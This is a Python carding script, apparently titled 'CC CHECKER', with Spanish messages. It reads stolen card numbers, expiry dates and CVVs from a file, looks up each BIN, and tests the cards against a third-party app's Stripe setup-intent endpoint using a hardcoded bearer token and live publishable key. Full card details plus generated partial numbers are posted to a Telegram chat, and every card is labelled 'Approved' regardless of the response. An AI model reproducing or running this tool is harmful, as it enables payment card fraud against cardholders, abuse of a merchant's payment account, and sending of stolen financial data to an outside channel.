import asyncio
import requests
import time
import json
import re
import random
from datetime import datetime
from colorama import Fore
import aiogram
import os
from config import BOT_TOKEN, CHAT_ID

async def send_messages():
   
    bot = aiogram.Bot(token=BOT_TOKEN)
    chat_id = CHAT_ID
 
    with open('data.txt') as file:
        lines = file.readlines()
    
    for i, line in enumerate(lines, start=1):
       
        linea = line[:28]
        cxc = line[:12]
        ccs = str(linea)

        input_data = re.findall(r'[0-9]+', str(ccs))
        cc = input_data[0]
        mes = input_data[1]
        ano = input_data[2]
        cvv = input_data[3]

        bin_code = cxc[0:6]
        
        try:
            req = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
            data = req.json()
            
            brand = data.get('brand', 'DESCONOCIDO')
            country_name = data.get('country_name', 'DESCONOCIDO')
            flag = data.get('country_flag', '🏳️')
            bank = data.get('bank', 'NO DISPONIBLE')
            levels = data.get('level', 'N/A')
            typea = data.get('type', 'DESCONOCIDO')
            
        except Exception as e:
            print(f"{Fore.RED}❌ Error al obtener BIN {bin_code}: {e}{Fore.RESET}")
            continue

        headers = {
        'authority': 'api.alivebywhitney.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjby5jYW52YXNjcmVhdGl2ZS5hbGl2ZS5hcGkiLCJpYXQiOjE3MDA2MDQ0MjAsImV4cCI6MjMzMTMyNDQyMCwic3ViIjoiMTUwMTEzNiJ9.jeeqIUvEo2JE7Zd4nyjIjkGfIbwWr2hEfIczYjd4IUY',
        'origin': 'https://app.aliveapp.co',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

        json_data = {}
        
        max_retries = 3
        id = None
        id2 = None
        
        for intento in range(max_retries):
            try:
                response1 = requests.post(
                    'https://api.alivebywhitney.com/v1.1/stripe/setup_intent', 
                    headers=headers, 
                    json=json_data,
                    timeout=15
                )
                decoded_response = response1.text
                result = json.loads(decoded_response)
                id = result['id']
                id2 = result['client_secret']
                break
                
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Intento {intento+1}/{max_retries} falló: {e}{Fore.RESET}")
                if intento == max_retries - 1:
                    print(f"{Fore.RED}❌ No se pudo conectar. Omitiendo esta CC...{Fore.RESET}")
                    continue
                time.sleep(3)
        
        if id is None:
            continue
        
        time.sleep(2.1)

        headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    }

        data = {
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': cc,
        'payment_method_data[card][cvc]': cvv,
        'payment_method_data[card][exp_year]': ano,
        'payment_method_data[card][exp_month]': mes,
        'payment_method_data[billing_details][address][postal_code]': '10002',
        'payment_method_data[billing_details][address][country]': 'US',
        'payment_method_data[pasted_fields]': 'number',
        'payment_method_data[payment_user_agent]': 'stripe.js/b3c82edf0b; stripe-js-v3/b3c82edf0b; payment-element',
        'payment_method_data[referrer]': 'https://app.aliveapp.co',
        'payment_method_data[time_on_page]': '108402',
        'payment_method_data[guid]': 'f86b00f6-f09a-4389-98be-a2b621e3048b0f77a1',
        'payment_method_data[muid]': 'b9ee3368-124e-41e9-840b-134f5f3ee54f502210',
        'payment_method_data[sid]': 'c469769a-3783-4a1f-b540-beb001bceaa204fc57',
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_51JZzhKFOzH0Ze7l25LzNoUuezjcEUnwPOzJLSElIvsRiac7EOBPKSStQxFWQPErwmbL0eYK7a5xl4hE8zsi4Qdes00rOXU0qQj',
        'client_secret': id2,
    }

        try:
            response = requests.post(
                'https://api.stripe.com/v1/setup_intents/' + id + '/confirm', 
                headers=headers, 
                data=data,
                timeout=15
            )
            response_data = json.loads(response.text)
        except Exception as e:
            print(f"{Fore.RED}❌ Error en Stripe: {e}{Fore.RESET}")
            continue

        status = response_data.get('status', '')
        message = response_data.get('error', {}).get('message', '')

        respuesta = "Approved ✅"

        def generar_extra_con_variacion(cc_completa, mes_extra, año_extra):
            opciones = [6, 8, 10, 12]
            mostrar = random.choice(opciones)
            if mostrar > 12:
                mostrar = 12
            parte_visible = cc_completa[:mostrar]
            parte_oculta = "x" * (16 - mostrar)
            numero_extra = parte_visible + parte_oculta
            return f"▸ {numero_extra}|{mes_extra}|{año_extra}|rnd"
        
        now = datetime.now()
        año_actual = now.year
        mes_actual = now.month
        años_disponibles = [str(y) for y in range(año_actual + 1, año_actual + 6)]
        extras = []
        meses_validos = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
        
        for _ in range(4):
            año_extra = random.choice(años_disponibles)
            if int(año_extra) == año_actual:
                meses_futuros = [m for m in meses_validos if int(m) > mes_actual]
                if meses_futuros:
                    mes_extra = random.choice(meses_futuros)
                else:
                    mes_extra = random.choice(meses_validos)
            else:
                mes_extra = random.choice(meses_validos)
            extra = generar_extra_con_variacion(cc, mes_extra, año_extra)
            extras.append(extra)
        
        extra_formatted = "\n".join(extras)
        
        bank_name = bank.upper() if bank else 'NO DISPONIBLE'
        brand_name = brand.upper() if brand else 'DESCONOCIDO'
        type_name = typea.upper() if typea else 'DESCONOCIDO'
        level_name = levels.upper() if levels else 'N/A'
        country_name_upper = country_name.upper() if country_name else 'DESCONOCIDO'
        
        caption = f"""<a href='https://i.postimg.cc/MKYj9MSc/file-000000000f3c720eb6a0dc7ad95f6c4c.png'>&#8203;</a>
★ 𝐆𝐎𝐇𝐀𝐍 𝐒𝐂𝐑𝐀𝐏𝐏𝐄𝐑 ★
────────────────
➜ # {bin_code}
────────────────
𝗖𝗖: {cc}|{mes}|{ano}|{cvv}
𝗜𝗡𝗙𝗢: {brand_name} - {type_name} - {level_name}
𝗕𝗔𝗡𝗞: {bank_name}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country_name_upper} {flag if flag else ''}
────────────
𝗘𝗫𝗧𝗥𝗔 ➜
{extra_formatted}
➜ Status: {respuesta}
━━━━━━━━━━
Creador ★@RUMi💗「ᴼʷⁿᵉʳ」"""
        
        print(f"\n{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}")
        print(caption)
        print(f"{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}")
        print(Fore.GREEN + f"✅ [{i}] {cc[:12]}xxxx -> {respuesta}" + Fore.RESET)
        
        try:
            await bot.send_message(chat_id, caption, parse_mode='HTML')
            print(Fore.GREEN + f"✅ Mensaje {i} enviado a Telegram" + Fore.RESET)
            time.sleep(5.4)
            
        except Exception as e:
            print(Fore.RED + f"❌ Error al enviar a Telegram: {e}" + Fore.RESET)

      
if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + '''
    ╔═══════════════════════════════════════╗
    ║   CC CHECKER - EXTRAS VARIADOS       ║
    ║   By: 𝐆𝐎𝐇𝐀𝐍 𝐒𝐂𝐑𝐀𝐏𝐏𝐄𝐑 (Versión Final)       ║
    ╚═══════════════════════════════════════╝
    ''' + Fore.RESET)
    asyncio.run(send_messages())